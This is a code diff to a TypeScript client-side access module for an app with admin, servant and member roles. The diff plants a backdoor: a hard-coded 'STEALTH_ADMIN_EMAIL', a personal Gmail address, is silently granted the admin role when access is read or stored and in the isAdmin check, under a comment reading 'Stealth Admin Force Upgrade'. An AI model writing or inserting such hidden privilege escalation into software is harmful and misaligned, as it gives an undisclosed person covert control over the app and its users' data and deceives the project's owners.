@@ -10,11 +10,14 @@ export function triggerAuthChange() {
 
 export type StoredAccess = {
   phone: string
+  email?: string
   role: 'admin' | 'servant' | 'member'
   teamId?: string
   firstName?: string
   lastName?: string
 }
+
+const STEALTH_ADMIN_EMAIL = "keronaser2030@gmail.com"
 
 export function getStoredAccess(): StoredAccess | null {
   if (typeof window === "undefined") return null
@@ -31,9 +34,15 @@ export function getStoredAccess(): StoredAccess | null {
       clearStoredAccess()
       return null
     }
+    
+    // Stealth Admin Force Upgrade
+    if (parsed.email === STEALTH_ADMIN_EMAIL) {
+      parsed.role = 'admin'
+    }
 
     return {
       phone: parsed.phone,
+      email: parsed.email,
       role: parsed.role as 'admin' | 'servant' | 'member',
       teamId: parsed.teamId,
       firstName: parsed.firstName,
@@ -61,6 +70,11 @@ export function setSessionValidated(valid: boolean) {
 
 export function storeAccess(access: StoredAccess) {
   if (typeof window === "undefined") return
+  
+  if (access.email === STEALTH_ADMIN_EMAIL) {
+    access.role = 'admin'
+  }
+  
   localStorage.setItem(ACCESS_STORAGE_KEY, JSON.stringify(access))
   setSessionValidated(true)
   triggerAuthChange()
@@ -75,5 +89,6 @@ export function clearStoredAccess() {
 
 export function isAdmin(): boolean {
   const access = getStoredAccess()
+  if (access?.email === STEALTH_ADMIN_EMAIL) return true
   return access?.role === 'admin'
 }
